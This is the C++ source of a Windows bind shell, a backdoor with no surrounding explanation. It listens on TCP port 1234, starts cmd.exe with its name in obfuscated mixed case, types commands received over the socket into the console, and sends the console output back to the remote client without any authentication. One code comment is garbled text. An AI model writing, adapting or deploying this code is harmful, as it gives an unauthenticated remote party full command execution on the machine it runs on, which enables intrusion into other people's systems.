#include<iostream.h>
#include <assert.h>
#include <WINSOCK2.H>
#include <string.h>
#include<windows.h>

#include<stdio.h>
#pragma comment(lib,"Ws2_32.lib")


SOCKET CreateSocket(DWORD dwIP, WORD wPort);
BOOL InitSock();
int SetTimeOut(SOCKET Socket,int nTimeOut);
int SetTimeOut(SOCKET s, bool read, bool write, int timeout_sec);
SOCKET Accept(SOCKET Socket, int TimeOut_sec);
int GetCmdLine(SOCKET Socket, char *RecvBuf, int BufSize, int nTimeOut);


HANDLE hCONIN, hCONOUT;
HANDLE hStdInput, hStdOutput;
HANDLE hStdCmdInPipe, hCmdPipe;

HANDLE hCmd;

void DoExecute(char *Cmd)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si,0,sizeof(si));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.hStdInput = hCONIN;
	si.hStdOutput = si.hStdError = hCONOUT;
	si.wShowWindow=SW_SHOW;//
	si.lpDesktop = "winsta0\\default";

	if(CreateProcess(NULL,Cmd,NULL,NULL,TRUE,0,0,NULL,&si,&pi))
	{
		hCmd = pi.hProcess;
	}
}

int WriteKeyToCmdConsoleInput(HANDLE hInPut, char ch)
{
	DWORD nEventWritten;
	BOOL fSuccess;
	INPUT_RECORD InputRecord;
	InputRecord.EventType = KEY_EVENT;
	InputRecord.Event.KeyEvent.uChar.AsciiChar = ch;

	fSuccess = WriteConsoleInput(hInPut, &InputRecord, 1, &nEventWritten);
	
	return fSuccess;
}
int WriteMessageToCmd(char *CmdMsg)
{
	DWORD BytesWritten;
	BOOL fSuccess;
	HANDLE hOutPut;
	hOutPut = CreateFile("conout$", 
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE, 
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0);
	if(hOutPut == INVALID_HANDLE_VALUE)
		return 0;

	fSuccess = WriteFile(hOutPut, CmdMsg, strlen(CmdMsg), &BytesWritten, NULL);
	CloseHandle(hOutPut);
	
	return fSuccess;
}
int WriteToCmdConsole(char *CmdMsg)
{
	int CmdLen = strlen(CmdMsg);
	BOOL fSuccess;
	HANDLE hInPut;

	hInPut = CreateFile("conin$", 
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ, 
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0);
	if(hInPut == INVALID_HANDLE_VALUE)
		return 0;

	for(int i=0; i<CmdLen; i++)
	{
		fSuccess = WriteKeyToCmdConsoleInput(hInPut, CmdMsg[i]);
		if(fSuccess == false)
			break;
	}
	CloseHandle(hInPut);
	return i;
}


int SendResponseOfCMD(SOCKET Socket, COORD *InitPos)
{
	int ErrorCode;
    HANDLE hStdout; 
    BOOL fSuccess; 

	char scrBuf[8192];
	DWORD BytesWritten, bytesRead;
	COORD CurrPos = {0, 0}, ReadPos = {0, 0}, dwSize = {80, 25};
	COORD PrevPos;
	CONSOLE_SCREEN_BUFFER_INFO csbiInfo;

	SMALL_RECT srctScrollRect, srctClipRect; 
	CHAR_INFO chiFill; 
	COORD coordDest; 

	//if(!SetConsoleScreenBufferSize(hCONOUT, dwSize))
	//	ErrorCode = GetLastError();

	PrevPos = *InitPos;
	while(1)
	{
		hStdout = CreateFile("conout$", GENERIC_READ | GENERIC_WRITE,FILE_SHARE_WRITE, NULL,OPEN_EXISTING,0,0);
		if(hStdout == INVALID_HANDLE_VALUE)
			return 0;

		
		if(!GetConsoleScreenBufferInfo(hStdout, &csbiInfo))
		{
			ErrorCode = GetLastError();
			break;
		}

		CurrPos = csbiInfo.dwCursorPosition;

		if(PrevPos.Y > CurrPos.Y)
		{
			PrevPos.X = csbiInfo.srWindow.Left;
			PrevPos.Y = csbiInfo.srWindow.Top;
			//break;
		}

		if((PrevPos.X == CurrPos.X) && (PrevPos.Y == CurrPos.Y))
			break;

		bytesRead = (CurrPos.Y - PrevPos.Y)*80 + CurrPos.X - PrevPos.X;
		ReadPos.X = PrevPos.X;
		ReadPos.Y = PrevPos.Y;
		if(bytesRead>sizeof(scrBuf))
		{
			bytesRead = sizeof(scrBuf);
			PrevPos.X = (PrevPos.X+sizeof(scrBuf))%80;
			PrevPos.Y += sizeof(scrBuf)/80 + (PrevPos.X < ReadPos.X)?1:0;
		}else
		{
			PrevPos = csbiInfo.dwCursorPosition;
		}

		fSuccess = ReadConsoleOutputCharacter(
			hStdout,
			scrBuf,
			bytesRead,
			ReadPos,
			&bytesRead);


		if (! fSuccess) 
		{
			return 0;
		}

		if(CurrPos.Y > 200)
		{
			coordDest.X = CurrPos.X;
			coordDest.Y = 0;
			SetConsoleCursorPosition(hStdout, coordDest);
			PrevPos.Y = 0;
		}

		fSuccess = send(Socket, scrBuf, bytesRead, 0);
		if(fSuccess <= 0)
		{
			return 0;
		}

		Sleep(100);
	}
	CloseHandle(hStdout);
	return 1;
}

int ProcessDataFromClient(SOCKET Socket)
{ 
    HANDLE hStdin, hStdout;
    char szBuf[8192]; 
 
	CONSOLE_SCREEN_BUFFER_INFO csbiInfo; 
	COORD CurrPos={0,0};
    hStdin = hStdInput; 

    while(1) 
    {
		szBuf[0] = '\0';
		SendResponseOfCMD(Socket, &CurrPos);
		if(! GetCmdLine(Socket, szBuf, sizeof(szBuf), -1))
			break;

		if(szBuf[0] == '\0')
		{
			if(! WriteToCmdConsole("\r"))
				break;

			continue;
		}

		if(! WriteToCmdConsole(szBuf))
			break;

		hStdout = CreateFile("conout$", GENERIC_READ | GENERIC_WRITE,FILE_SHARE_WRITE, NULL,OPEN_EXISTING,0,0);
		GetConsoleScreenBufferInfo(hStdout, &csbiInfo);
		CurrPos = csbiInfo.dwCursorPosition;
		CurrPos.X = 0;
		CurrPos.Y++;
		CloseHandle(hStdout);

		if(! WriteToCmdConsole("\r"))
			break;

		Sleep(100);
		
    }
	CloseHandle(hStdin);
    return 0; 
}


int XCMD(SOCKET Socket)
{
	char Buffer[256]="\0";

	SMALL_RECT Rect;
    Rect.Top = 0;    // top left: row 0, col 0 
    Rect.Left = 0; 
    Rect.Bottom = 24; // bot. right: row 1, col 79 
    Rect.Right = 79; 
	BOOL fSuccess; 
	SECURITY_ATTRIBUTES SecuAttr;
	SecuAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	SecuAttr.lpSecurityDescriptor = NULL;
	SecuAttr.bInheritHandle = TRUE;

	fSuccess = FreeConsole();
	fSuccess = AllocConsole();

	hStdInput = GetStdHandle(STD_INPUT_HANDLE);
	hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);

	SetHandleInformation(hStdInput, 1, 0);
	SetHandleInformation(hStdOutput, 1, 0);

	hCONIN = CreateFile("conin$", GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ, 
		&SecuAttr,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	hCONOUT = CreateFile("conout$", GENERIC_READ | GENERIC_WRITE,FILE_SHARE_WRITE, 
		&SecuAttr,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

	COORD cd = {79, ~0};
	SetConsoleScreenBufferSize(hCONOUT, cd);
	SetConsoleWindowInfo(hCONOUT, true, &Rect);
	SetConsoleCtrlHandler(NULL, 0);
	DoExecute("cMD.eXe");
	Sleep(500);

	SetConsoleCtrlHandler(NULL, 1);
	SetConsoleMode(hCONIN, ENABLE_LINE_INPUT|ENABLE_WINDOW_INPUT);

	ProcessDataFromClient(Socket);

	FreeConsole();
	return 1;
}


int GetCmdLine(SOCKET Socket, char *RecvBuf, int BufSize, int nTimeOut)
{
    int nRetVal = 0;
	int cmdlen = 0;
	while(cmdlen < BufSize)
	{
		nRetVal = SetTimeOut(Socket, nTimeOut);
		if(nRetVal == SOCKET_ERROR)
		{
			return 0;
		}else if(nRetVal == 0)
		{
			return 0;
		}
		nRetVal = recv(Socket, RecvBuf+cmdlen, 1, 0);
		if(nRetVal <= 0)
			return 0;
		RecvBuf[cmdlen+nRetVal] = '\0';
		//////////////
		cmdlen += nRetVal;
		if(cmdlen == 1 && RecvBuf[0] == '\n')
		{
			RecvBuf[0] = 0;
			return 1;
		}
		if(cmdlen >= 2)
		{
			if(RecvBuf[cmdlen-1] == '\n')
			{
				RecvBuf[cmdlen-1] = '\0';
				if(RecvBuf[cmdlen-2] == '\r')
					RecvBuf[cmdlen-2] = '\0';
				return 1;
			}
		}
	}

    return 0;
}

SOCKET CreateSocket(DWORD dwIP, WORD wPort)//��dwIP�ϰ�wPort�˿�
{
	SOCKET sockid;

	if ((sockid = socket(PF_INET, SOCK_STREAM,IPPROTO_TCP)) == INVALID_SOCKET)
		return 0;
	struct sockaddr_in srv_addr = {0};
	srv_addr.sin_family = AF_INET;
	srv_addr.sin_addr.S_un.S_addr = dwIP;
	srv_addr.sin_port = htons(wPort);
	if (bind(sockid,(struct sockaddr*)&srv_addr,sizeof(struct sockaddr_in)) == SOCKET_ERROR)
		goto error;
	if (listen(sockid,3) == SOCKET_ERROR)
		goto error;
	return sockid;
error:
	closesocket(sockid);
	return 0;
}

BOOL InitSock()
{
	WSADATA wsadata;
	return WSAStartup(MAKEWORD(2,2),&wsadata) == 0;
}

int SetTimeOut(SOCKET Socket,int nTimeOut)
{   
	fd_set FdRead;
	struct timeval TimeOut;
	FD_ZERO(&FdRead);
	FD_SET(Socket,&FdRead);
	TimeOut.tv_sec  = nTimeOut;
	TimeOut.tv_usec = 0;
	return select(Socket+1,&FdRead,NULL,NULL,(nTimeOut == -1)?NULL:&TimeOut);
}

int SetTimeOut(SOCKET s, bool read, bool write, int timeout_sec)
{   
	int ret;
	DWORD timepassed = 0;
	fd_set FdRead, FdWrite;
	struct timeval TimeOut;


	TimeOut.tv_sec  = timeout_sec;
	TimeOut.tv_usec = 0;


	if(read)
	{
		FD_ZERO(&FdRead);
		FD_SET(s,&FdRead);
	}
	if(write)
	{
		FD_ZERO(&FdWrite);
		FD_SET(s,&FdWrite);
	}
	ret = select(s+1,
		read?&FdRead:NULL,
		write?&FdWrite:NULL,
		NULL,
		timeout_sec==-1?NULL:&TimeOut);


//	DWORD err = WSAGetLastError();
	return ret;
}

SOCKET Accept(SOCKET Socket, int TimeOut_sec)
{
	if(SetTimeOut(Socket, 1, 0, TimeOut_sec) <= 0)
		return -1;

	return accept(Socket, NULL, NULL);
}

SOCKET Accept(SOCKET Socket)
{
	return Accept(Socket, -1);
}

void main()
{
	InitSock();

	SOCKET s = CreateSocket(0, 1234);
	if(s == INVALID_SOCKET)
		return;

	SOCKET as = Accept(s);
	if(as == INVALID_SOCKET)
		return;

	XCMD(as);

	TerminateProcess(hCmd, 0);
}